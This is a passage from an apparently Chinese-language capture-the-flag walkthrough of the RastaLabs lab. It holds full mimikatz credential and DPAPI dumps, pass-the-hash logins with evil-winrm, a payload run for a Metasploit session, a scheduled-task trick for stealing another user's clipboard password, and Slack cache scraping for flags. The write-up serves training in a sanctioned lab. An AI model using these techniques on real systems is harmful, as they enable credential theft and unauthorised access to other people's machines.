    ntlm-14: a2079302f3bd3c5b5bcb83adcf0cc349
    ntlm-15: 1e30f82e01cef3944538b28873fa38e2
    ntlm-16: 867df53120650f6fcad7bfebe9bc7021
    ntlm-17: efae739f8996c024f4288796d4a57e34
    ntlm-18: b73aac68acc77b010c046da196c05df6
    ntlm-19: f9510d5993695f35df0e8db9c7845215
    ntlm-20: c2027463e0b5f8ea69667f00860f73f3
    ntlm-21: c2f847adf09730951861de32251ef60f
    ntlm-22: ad7de2f6ecb5e2a52b6caed6fa76b67c
    ntlm-23: f2f29427ca2798a4f269520d192bb08e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 20448b150995b05353fa8ff2320b690a

* Primary:Kerberos-Newer-Keys *
    Default Salt : WS01.RASTALABS.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 7eed63d5cce04bb32ae6cc5d618153004a9d8d74d90817e836dbe8979be180bc
      aes128_hmac       (4096) : 2b86583483032c694395e621db2779df
      des_cbc_md5       (4096) : 8925294c7c407064
    OldCredentials
      aes256_hmac       (4096) : b4f740624bc3c83d172663cd0ca8252f3d1203288ee029cf7d1b18a547f198a5
      aes128_hmac       (4096) : ba88ce4cdecc937c6a6b15c8c7415f2e
      des_cbc_md5       (4096) : 3e46850e799116da
    OlderCredentials
      aes256_hmac       (4096) : d1192c4d5e47bd338823117febe2487e635205e5ec2a71b6eb9c2546a128da2b
      aes128_hmac       (4096) : 866a57420e047c637122e6514551208f
      des_cbc_md5       (4096) : 4c20c1c2a4911f67

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WS01.RASTALABS.LOCALAdministrator
    Credentials
      des_cbc_md5       : 8925294c7c407064
    OldCredentials
      des_cbc_md5       : 3e46850e799116da


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 3bdd847d6f1655843123b931cd376e3e
    lm  - 0: b7beecd5c212526198f47b83292f32f6
    ntlm- 0: 3bdd847d6f1655843123b931cd376e3e

```

##### sekurlsa::logonpasswords
```plain
C:\WINDOWS\system32>C:\Users\Public\mimikatz.exe
C:\Users\Public\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 307301 (00000000:0004b065)
Session           : Interactive from 1
User Name         : rweston
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 17/03/2026 03:09:14
SID               : S-1-5-21-1396373213-2872852198-2033860859-1154
        msv :
         [00000003] Primary
         * Username : rweston
         * Domain   : RLAB
         * NTLM     : 3ff61fa259deee15e4042159d7b832fa
         * SHA1     : fb1ff95bca66348334fbca023809d498e82bd9e1
         * DPAPI    : 184af2e04895b8d13f98795c67e215b9
        tspkg :
        wdigest :
         * Username : rweston
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : rweston
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 306642 (00000000:0004add2)
Session           : Interactive from 1
User Name         : rweston
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 17/03/2026 03:09:14
SID               : S-1-5-21-1396373213-2872852198-2033860859-1154
        msv :
         [00000003] Primary
         * Username : rweston
         * Domain   : RLAB
         * NTLM     : 3ff61fa259deee15e4042159d7b832fa
         * SHA1     : fb1ff95bca66348334fbca023809d498e82bd9e1
         * DPAPI    : 184af2e04895b8d13f98795c67e215b9
        tspkg :
        wdigest :
         * Username : rweston
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : rweston
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 82355 (00000000:000141b3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : RLAB
         * NTLM     : f572299a1f571e27a3d3b0670b8d5d1e
         * SHA1     : dcbca7d484d205c5d0250d3d9e02d112ac1e8d3a
         * DPAPI    : dcbca7d484d205c5d0250d3d9e02d112
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : rastalabs.local
         * Password : f9 f5 15 32 d2 74 7f 50 b4 61 41 94 7b 15 a4 b4 17 f8 dd b9 00 ef 93 a9 0b 73 72 d2 bc 76 91 f6 8c c4 d0 e5 75 f0 ee d4 cd f1 35 19 e9 02 04 8d ba 66 76 31 88 ce f4 0b f1 67 3c a7 f2 9a 3d 9c 9b 7d ea d5 80 05 29 92 9e 61 39 0e 67 ba 74 81 3d 52 93 9e c6 cb 96 ac 3c d1 2e c2 5d 82 1f d3 2c fa d9 5f 7e a6 5c 07 e3 04 45 5e 0a 75 61 c1 0a d4 a2 61 c1 cd 70 fe 59 84 bf 0d cb a6 40 ab 0e b4 8a c0 87 25 b3 18 3f f1 2c fa dc c1 e7 0e 9c 4a e5 27 8f 6b cb 97 ad b7 e3 cd 88 5d 68 b4 4c 47 ab 30 86 c3 75 96 49 2d 72 27 30 07 46 51 24 c6 83 ba 6c 39 1a 74 fd 93 be 4e c0 da 7d 37 44 49 5b 9b c6 9c ab 07 0c 0a 3f f9 9c 63 9f 80 77 5d 6e 80 db 53 96 e6 9f 57 ff 6c dc 02 84 63 a8 a9 08 a7 e7 57 1f 99 92 28 76 1a 0e ed 19 38 
        ssp :   KO
        credman :

Authentication Id : 0 ; 82339 (00000000:000141a3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : RLAB
         * NTLM     : f572299a1f571e27a3d3b0670b8d5d1e
         * SHA1     : dcbca7d484d205c5d0250d3d9e02d112ac1e8d3a
         * DPAPI    : dcbca7d484d205c5d0250d3d9e02d112
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : rastalabs.local
         * Password : f9 f5 15 32 d2 74 7f 50 b4 61 41 94 7b 15 a4 b4 17 f8 dd b9 00 ef 93 a9 0b 73 72 d2 bc 76 91 f6 8c c4 d0 e5 75 f0 ee d4 cd f1 35 19 e9 02 04 8d ba 66 76 31 88 ce f4 0b f1 67 3c a7 f2 9a 3d 9c 9b 7d ea d5 80 05 29 92 9e 61 39 0e 67 ba 74 81 3d 52 93 9e c6 cb 96 ac 3c d1 2e c2 5d 82 1f d3 2c fa d9 5f 7e a6 5c 07 e3 04 45 5e 0a 75 61 c1 0a d4 a2 61 c1 cd 70 fe 59 84 bf 0d cb a6 40 ab 0e b4 8a c0 87 25 b3 18 3f f1 2c fa dc c1 e7 0e 9c 4a e5 27 8f 6b cb 97 ad b7 e3 cd 88 5d 68 b4 4c 47 ab 30 86 c3 75 96 49 2d 72 27 30 07 46 51 24 c6 83 ba 6c 39 1a 74 fd 93 be 4e c0 da 7d 37 44 49 5b 9b c6 9c ab 07 0c 0a 3f f9 9c 63 9f 80 77 5d 6e 80 db 53 96 e6 9f 57 ff 6c dc 02 84 63 a8 a9 08 a7 e7 57 1f 99 92 28 76 1a 0e ed 19 38 
        ssp :   KO
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : RLAB
         * NTLM     : f572299a1f571e27a3d3b0670b8d5d1e
         * SHA1     : dcbca7d484d205c5d0250d3d9e02d112ac1e8d3a
         * DPAPI    : dcbca7d484d205c5d0250d3d9e02d112
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : ws01$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 47478 (00000000:0000b976)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : RLAB
         * NTLM     : f572299a1f571e27a3d3b0670b8d5d1e
         * SHA1     : dcbca7d484d205c5d0250d3d9e02d112ac1e8d3a
         * DPAPI    : dcbca7d484d205c5d0250d3d9e02d112
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : rastalabs.local
         * Password : f9 f5 15 32 d2 74 7f 50 b4 61 41 94 7b 15 a4 b4 17 f8 dd b9 00 ef 93 a9 0b 73 72 d2 bc 76 91 f6 8c c4 d0 e5 75 f0 ee d4 cd f1 35 19 e9 02 04 8d ba 66 76 31 88 ce f4 0b f1 67 3c a7 f2 9a 3d 9c 9b 7d ea d5 80 05 29 92 9e 61 39 0e 67 ba 74 81 3d 52 93 9e c6 cb 96 ac 3c d1 2e c2 5d 82 1f d3 2c fa d9 5f 7e a6 5c 07 e3 04 45 5e 0a 75 61 c1 0a d4 a2 61 c1 cd 70 fe 59 84 bf 0d cb a6 40 ab 0e b4 8a c0 87 25 b3 18 3f f1 2c fa dc c1 e7 0e 9c 4a e5 27 8f 6b cb 97 ad b7 e3 cd 88 5d 68 b4 4c 47 ab 30 86 c3 75 96 49 2d 72 27 30 07 46 51 24 c6 83 ba 6c 39 1a 74 fd 93 be 4e c0 da 7d 37 44 49 5b 9b c6 9c ab 07 0c 0a 3f f9 9c 63 9f 80 77 5d 6e 80 db 53 96 e6 9f 57 ff 6c dc 02 84 63 a8 a9 08 a7 e7 57 1f 99 92 28 76 1a 0e ed 19 38 
        ssp :   KO
        credman :

Authentication Id : 0 ; 47404 (00000000:0000b92c)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : RLAB
         * NTLM     : f572299a1f571e27a3d3b0670b8d5d1e
         * SHA1     : dcbca7d484d205c5d0250d3d9e02d112ac1e8d3a
         * DPAPI    : dcbca7d484d205c5d0250d3d9e02d112
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : rastalabs.local
         * Password : f9 f5 15 32 d2 74 7f 50 b4 61 41 94 7b 15 a4 b4 17 f8 dd b9 00 ef 93 a9 0b 73 72 d2 bc 76 91 f6 8c c4 d0 e5 75 f0 ee d4 cd f1 35 19 e9 02 04 8d ba 66 76 31 88 ce f4 0b f1 67 3c a7 f2 9a 3d 9c 9b 7d ea d5 80 05 29 92 9e 61 39 0e 67 ba 74 81 3d 52 93 9e c6 cb 96 ac 3c d1 2e c2 5d 82 1f d3 2c fa d9 5f 7e a6 5c 07 e3 04 45 5e 0a 75 61 c1 0a d4 a2 61 c1 cd 70 fe 59 84 bf 0d cb a6 40 ab 0e b4 8a c0 87 25 b3 18 3f f1 2c fa dc c1 e7 0e 9c 4a e5 27 8f 6b cb 97 ad b7 e3 cd 88 5d 68 b4 4c 47 ab 30 86 c3 75 96 49 2d 72 27 30 07 46 51 24 c6 83 ba 6c 39 1a 74 fd 93 be 4e c0 da 7d 37 44 49 5b 9b c6 9c ab 07 0c 0a 3f f9 9c 63 9f 80 77 5d 6e 80 db 53 96 e6 9f 57 ff 6c dc 02 84 63 a8 a9 08 a7 e7 57 1f 99 92 28 76 1a 0e ed 19 38 
        ssp :   KO
        credman :

Authentication Id : 0 ; 46028 (00000000:0000b3cc)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 17/03/2026 03:08:59
SID               : 
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : RLAB
         * NTLM     : f572299a1f571e27a3d3b0670b8d5d1e
         * SHA1     : dcbca7d484d205c5d0250d3d9e02d112ac1e8d3a
         * DPAPI    : dcbca7d484d205c5d0250d3d9e02d112
        tspkg :
        wdigest :
        kerberos :
        ssp :   KO
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 17/03/2026 03:08:59
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : ws01$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :   KO
        credman :

```

### rweston
```plain
proxychains -q evil-winrm -i 10.10.121.112 -u rweston -H 3ff61fa259deee15e4042159d7b832fa
```

#### msf
```plain
*Evil-WinRM* PS C:\WINDOWS\system32>C:\Users\Public\updata.exe
```

#### sekurlsa::dpapi
```plain
mimikatz # "sekurlsa::dpapi"

Authentication Id : 0 ; 307301 (00000000:0004b065)
Session           : Interactive from 1
User Name         : rweston
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 17/03/2026 03:09:14
SID               : S-1-5-21-1396373213-2872852198-2033860859-1154
         [00000000]
         * GUID      :  {ee92301b-19f5-4b6f-bc0a-fd267b6b470b}
         * Time      :  17/03/2026 06:00:50
         * MasterKey :  bbfdda29906cd49b7ca3e019a1f2dd79d153611a2c3e932520e41b3d228cec844e2ae46faa2abe236612f52da93b26e85d08c562a7288327d318a65b641f23af
         * sha1(key) :  41b1f0cf6dd5b92a44e0c9aac61b2f7c51a5cd3b
         [00000001]
         * GUID      :  {576e5548-da71-4935-b0a4-50fea1045790}
         * Time      :  17/03/2026 05:54:21
         * MasterKey :  f9b81ffd0443d73ccd2d57c510095cce1e988510c35bda6aa10eaf2b66fcee4c6550e588190003b8c9521a4e10a780402846eddb913ee8adf4ea4956695177c7
         * sha1(key) :  c8deb02e3a4a01e76c7d8dc1996c6a3144d6dfc5
         [00000002]
         * GUID      :  {64827a3c-5bee-42ca-9687-bb094fd326df}
         * Time      :  17/03/2026 03:39:23
         * MasterKey :  6d9135e0f910ba6404afcdc4751d3f4b0e2209a9347e8a157ef6c9126485b766cdad7e84e8e50a64e42ff84a50c81df5de65bafd6c78499ab891e0aa3b6bffbd
         * sha1(key) :  baa0600292684e0d188425a7bf0b4a58e75ecf6c
         [00000003]
         * GUID      :  {42f28986-b575-48e5-a705-b1d659726a61}
         * Time      :  17/03/2026 03:09:26
         * MasterKey :  d1d95bc205a010117446201ea3e8641de7c7609d13bd9e44c90835844c8953b120caa1e95a73dc24af42fd8954b48e2d26401388056ef532f36cb834d611ecb7
         * sha1(key) :  7341b5483574d0cdc48acc5c9ee849e0b6f09a6c


Authentication Id : 0 ; 306642 (00000000:0004add2)
Session           : Interactive from 1
User Name         : rweston
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 17/03/2026 03:09:14
SID               : S-1-5-21-1396373213-2872852198-2033860859-1154


Authentication Id : 0 ; 82355 (00000000:000141b3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 82339 (00000000:000141a3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-19


Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-20


Authentication Id : 0 ; 47478 (00000000:0000b976)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-96-0-1


Authentication Id : 0 ; 47404 (00000000:0000b92c)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 17/03/2026 03:09:00
SID               : S-1-5-96-0-0


Authentication Id : 0 ; 46028 (00000000:0000b3cc)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 17/03/2026 03:08:59
SID               : 


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 17/03/2026 03:08:59
SID               : S-1-5-18
         [00000000]
         * GUID      :  {b25edc36-807a-433d-985e-cb91f527faad}
         * Time      :  17/03/2026 05:28:49
         * MasterKey :  45c754f01d7e6fa23e4054e1948c8de38c7bb896042d716b997b55c554dc7aef29bbb38759e45b21c62a21a1cc03077106cdba8660ea7a589946e58cdfb34d7d
         * sha1(key) :  af92581f658a00f7705b894128b20b237d0afc6b
         [00000001]
         * GUID      :  {76da60cf-3020-41d5-8234-504313b661ad}
         * Time      :  17/03/2026 03:28:00
         * MasterKey :  8c1e8439aabdd1dd57d946e50ab436d5b65dbf56a27af05374bc91b5ac937ae058fc29538c8aa1aebbf023bb3f7179818c61bb5bf70cbd6d076ae9f793a45487
         * sha1(key) :  bb33f23f13e95fdd91469607655cac2c21735f4d
         [00000002]
         * GUID      :  {32f64a82-2e4a-4aed-8751-5a0769150457}
         * Time      :  17/03/2026 03:09:56
         * MasterKey :  42892cd2fcd91c4d4fa4360383b65e0dc6534814a6c55e538ba26bde41c4a9b2c9b9f0b86ea750a43de73937c40f4c440fecd75d7ce07ce62249f97307a72be4
         * sha1(key) :  3981a11564d103a60a4fbbd20b4c013c80a59ebf
         [00000003]
         * GUID      :  {d963f089-8a32-4812-80c6-be17ae237f3e}
         * Time      :  17/03/2026 06:14:34
         * MasterKey :  684fc7a788c0a01a02a3360b8d965df3df7161bd5deafbd27e03eb378e1733d119bed5a53a5be09370ee622e572dc35b745b0a865abce6fa38cc46cf50afa070
         * sha1(key) :  d9cca71b78adbb29d0de567935c54b382546abdd
         [00000004]
         * GUID      :  {234da58e-17aa-4c48-9186-32dc28d49b56}
         * Time      :  17/03/2026 06:14:34
         * MasterKey :  b3d56436db4ed100e259047c8983e2dfba33c1d13ec088166febc86e9e6ddbbf24ba74f9541378bc1fbfb34d24119dcac6cac6db9ec720a90043af3201efa528
         * sha1(key) :  0c188e0c140e10cb98bc542b66cf0059d39c5d99
         [00000005]
         * GUID      :  {b144d162-390a-4066-a7c1-7491165c63fd}
         * Time      :  17/03/2026 03:09:22
         * MasterKey :  28ba4350b3ac8e374287bcb5b5ae300d670c60d86dd651d9dd4ffe861bd2fb92e8187c7cb34f6298712fef686645ed06b9dc12cad45771e1a536e0282e41c61a
         * sha1(key) :  82186e616403de88f596c20e173c048156fc875b
         [00000006]
         * GUID      :  {0ef60038-407a-4257-80b5-be9b727ad1bc}
         * Time      :  17/03/2026 03:09:04
         * MasterKey :  8135e19d15e14458719adf9ff3202eca44c6fb5f6b4c0656c9a3dafbae0435926140b82c00421f06eb16a6aff74a6275fea2fc4b868946b3f1b666a32493089d
         * sha1(key) :  522484200ddcd814ccee6d2d48b4ed0bd50edca3
         [00000007]
         * GUID      :  {e15c4761-ebf8-4a29-9f31-292f62043492}
         * Time      :  17/03/2026 03:09:00
         * MasterKey :  0d39511b261ede1ad979cd144b295d3e07ffed0766f5f733fc170f03ded8f73b2fa8190295c5d9302735b75d3b4b0825fae6e4becd16332ddeffd22ce92c0bc7
         * sha1(key) :  25674c01750574de5e04d99a28164240fc410325
         [00000008]
         * GUID      :  {0af50e35-4750-4f0e-aca7-31f978e440f6}
         * Time      :  17/03/2026 03:09:00
         * MasterKey :  e442f7e9d56aa1c8ee6ce79d1d163551274291bcb0601aefeef315fb247164cc39c683d860d70d69d3b735b1bbb888bf498aacfbc31419945889317e87fed0d1
         * sha1(key) :  8e5769ed07eb1452178d9e6ce79d65cd4e19590e

```

#### 读取剪贴板失败原因
>  Windows 的剪贴板是绑定到 Window Station（窗口站）的，而窗口站又绑定到登录会话（Session）。
>
> 
>
>   WS01 上有两个关键会话：
>
> 
>
>   - Session 1（交互式桌面）：rweston 自动登录后在这里运行，startup.bat 的 Set-Clipboard 把密码写到了这个会话的剪贴板
>
>   - Session 0（非交互式/服务会话）：你所有远程 shell 都在这里
>
> 
>
>   你之前尝试的每种方式都在 Session 0：
>
>   方式: evil-winrm + Get-Clipboard
>
>   为什么失败: 网络登录（Type 3），分配到 Session 0，有自己独立的空剪贴板
>
>   ────────────────────────────────────────
>
>   方式: smbexec + mimikatz misc::clip
>
>   为什么失败: 以 SYSTEM 身份在 Session 0 运行，misc::clip 需要注册窗口消息钩子（RegisterClassEx），Session 0
>
>     没有桌面窗口站，直接报错
>
>   ────────────────────────────────────────
>
>   方式: psexec + mimikatz
>
>   为什么失败: 同上，Session 0 没有 GUI 环境
>
>   ────────────────────────────────────────
>
>   方式: meterpreter kiwi misc::clip
>
>   为什么失败: 两个问题：1) x86 kiwi 跑在 x64 系统上本身就有兼容问题；2) 同样在 Session 0，没有窗口站
>
>   ────────────────────────────────────────
>
>   方式: meterpreter shell + mimikatz misc::clip
>
>   为什么失败: 虽然用了 x64 mimikatz，但 shell 仍在 Session 0，misc::clip 挂起等待永远不会来的剪贴板事件，最终超时断连
>
>   ────────────────────────────────────────
>
>   方式: rweston 的 evil-winrm + Get-Clipboard
>
>   为什么失败: 虽然身份对了，但 evil-winrm 仍然是网络登录，Session 0，读的是自己会话的空剪贴板
>
>   为什么计划任务能读到
>
> 
>
>   schtasks /create ... /ru RLAB\rweston /it /f
>
> 
>
>   关键是 /it 这个参数（Interactive Only）。它告诉任务调度器：只在该用户的交互式会话中运行此任务。所以这个任务被调度到了
>
>   rweston 的 Session 1 里执行，和 startup.bat 共享同一个窗口站和剪贴板，自然就能读到 BullyBully。
>
> 
>
>   简单说就是：
>
> 
>
>   Session 0 (你的shell)  ──→  剪贴板A (空的)
>
>   Session 1 (rweston桌面) ──→  剪贴板B (BullyBully) ← startup.bat 写在这里
>
>                                   ↑
>
>                       schtasks /it 让任务跑在这里
>

#### 计划任务读取剪贴板
```plain
*Evil-WinRM* PS C:\WINDOWS\system32> schtasks /create /tn "ReadClip" /tr "powershell.exe -nop -c 'Get-Clipboard | Out-File C:\Windows\Temp\clip.txt'" /sc once /st 00:00 /ru RLAB\rweston /it /f
SUCCESS: The scheduled task "ReadClip" has successfully been created.

*Evil-WinRM* PS C:\WINDOWS\system32> schtasks /run /tn "ReadClip"
SUCCESS: Attempted to run the scheduled task "ReadClip".

*Evil-WinRM* PS C:\WINDOWS\system32> Start-Sleep -Seconds 3

*Evil-WinRM* PS C:\WINDOWS\system32> type C:\Windows\Temp\clip.txt
BullyBully
```

拿到凭据rweston\BullyBully

访问脚本指向网站https://10.10.120.254/

#### http://10.10.120.254
访问脚本指向网站https://10.10.120.254/

使用rweston\BullyBully登录

![](/image/hackthebox-prolabs/RastaLabs-36.png)

### Getflag
访问即可看见flag

![](/image/hackthebox-prolabs/RastaLabs-37.png)

```plain
 RASTA{c4r3ful_h0w_y0u_h4ndl3_cr3d5}  
```

## WS06-10.10.121.108-Slack
### evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q evil-winrm -i 10.10.121.108 -u heathc1iff -p 'Pass@123'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\heathc1iff\Documents> 
```

### <font style="color:rgb(6, 10, 38);">Slack IndexedDB-</font>查看缓存日志
**<font style="color:rgb(6, 10, 38);">Slack</font>**<font style="color:rgb(6, 10, 38);"> 是一款流行的</font>**<font style="color:rgb(6, 10, 38);">企业级即时通讯和协作平台</font>**<font style="color:rgb(6, 10, 38);">，主要用于团队沟通、项目协作和信息共享。</font>

```plain
*Evil-WinRM* PS C:\Users\heathc1iff\Documents> dir C:\Users\tquinn\AppData\Roaming\slack\IndexedDB\https_app.slack.com_0.indexeddb.leveldb


    Directory: C:\Users\tquinn\AppData\Roaming\slack\IndexedDB\https_app.slack.com_0.indexeddb.leveldb


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/3/2020  10:16 AM        3205414 000003.log
-a----         3/19/2020  11:50 PM             16 CURRENT
-a----         3/19/2020  11:50 PM              0 LOCK
-a----          8/3/2020  10:16 AM            342 LOG
-a----          8/3/2020  10:16 AM            342 LOG.old
-a----         3/19/2020  11:50 PM             23 MANIFEST-000001
```

| **<font style="color:rgb(6, 10, 38);">组成部分</font>** | **<font style="color:rgb(6, 10, 38);">含义</font>** |
| :--- | :--- |
| `<font style="color:rgb(6, 10, 38);">tquinn</font>` | <font style="color:rgb(6, 10, 38);">目标用户名</font> |
| `<font style="color:rgb(6, 10, 38);">slack</font>` | <font style="color:rgb(6, 10, 38);">Slack 桌面客户端数据目录</font> |
| `<font style="color:rgb(6, 10, 38);">IndexedDB</font>` | <font style="color:rgb(6, 10, 38);">浏览器式本地存储</font> |
| `<font style="color:rgb(6, 10, 38);">https_app.slack.com_0</font>` | <font style="color:rgb(6, 10, 38);">Slack Web 应用域</font> |
| `<font style="color:rgb(6, 10, 38);">leveldb</font>` | <font style="color:rgb(6, 10, 38);">LevelDB 数据库格式</font> |


### <font style="color:rgb(6, 10, 38);">Getflag</font>
日志提取flag

```plain
*Evil-WinRM* PS C:\Users\heathc1iff\Documents> Get-Content -Path "C:\Users\tquinn\AppData\Roaming\slack\IndexedDB\https_app.slack.com_0.indexeddb.leveldb\000003.log" | Select-String -Pattern "RASTA{"

_hidden_reply_"
               reply_countI"replies_"
                                     latest_reply_"
                                                   reply_users_"reply_users_count_"files_"
                                                                                          attachments_"blocksAo"type"   rich_textblock_id"PHdZelementsAo"type"rich_text_sectionelementsAo"type"text"text"
                                                                                                 The flag is
{o"type"text"text"RASTA{937_84ck_70_w02k}"styleo"codeT{{${${$"
```

拿到flag

```plain
RASTA{937_84ck_70_w02k}
```

## WS04-10.10.123.101-Secret
### packetcapture.cap
```plain
rastalabs.local\ngodfrey / zaq123$%^&*()_+
```

访问[https://10.10.110.254/owa/#path=/mail](https://10.10.110.254/owa/#path=/mail)

![](/image/hackthebox-prolabs/RastaLabs-38.png)

拿到packetcapture.cap,使用Wireshark/NetworkMiner导出其中的secret

### secret
![](/image/hackthebox-prolabs/RastaLabs-39.png)

成功拿到secret文件

![](/image/hackthebox-prolabs/RastaLabs-40.png)

### key.txt
```plain
*Evil-WinRM* PS C:\Users\heathc1iff\Documents> Get-ChildItem -Path C:\ -Recurse -Filter "key.txt" -Force -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime

FullName                                  Length LastWriteTime
--------                                  ------ -------------
C:\ProgramData\Microsoft OneDrive\key.txt    469 10/10/2023 2:39:58 PM
```

```plain
*Evil-WinRM* PS C:\Users\heathc1iff\Documents> download "C:\ProgramData\Microsoft OneDrive\key.txt" /home/kali/Desktop/htb/rastalabs/key.txt
                                        
Info: Downloading C:\ProgramData\Microsoft OneDrive\key.txt to /home/kali/Desktop/htb/rastalabs/key.txt
Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|          
```

### FileCryptography.psm1
[https://github.com/tmclnk/RepoCrypto/blob/master/FileCryptography.psm1](https://github.com/tmclnk/RepoCrypto/blob/master/FileCryptography.psm1)

> # 将secret重命名为 secret.AES
>
> # key.txt 里的内容是 DPAPI 加密的，绑定到加密它的用户和机器
>

```plain
upload /home/kali/Desktop/tools/RepoCrypto-master/FileCryptography.psm1 "C:\ProgramData\Microsoft OneDrive\FileCryptography.psm1"
upload /home/kali/Desktop/htb/rastalabs/secret.AES "C:\ProgramData\Microsoft OneDrive\secret.AES"
takeown /f "C:\ProgramData\Microsoft OneDrive\secret.AES" /a
icacls "C:\ProgramData\Microsoft OneDrive\secret.AES" /grant RLAB\bowen:F
```

确定key.txt为bowen所创

```plain
*Evil-WinRM* PS C:\ProgramData\Microsoft OneDrive> Get-Acl 'C:\ProgramData\Microsoft OneDrive\key.txt' | Select-Object Owner

Owner
-----
RLAB\bowen
```

### msf/bowen
```plain
meterpreter > shell
Process 2624 created.
Channel 2 created.
'\\fs01.rastalabs.local\home$\bowen\Desktop'
CMD.EXE was started with the above path as the current directory.
UNC paths are not supported.  Defaulting to Windows directory.
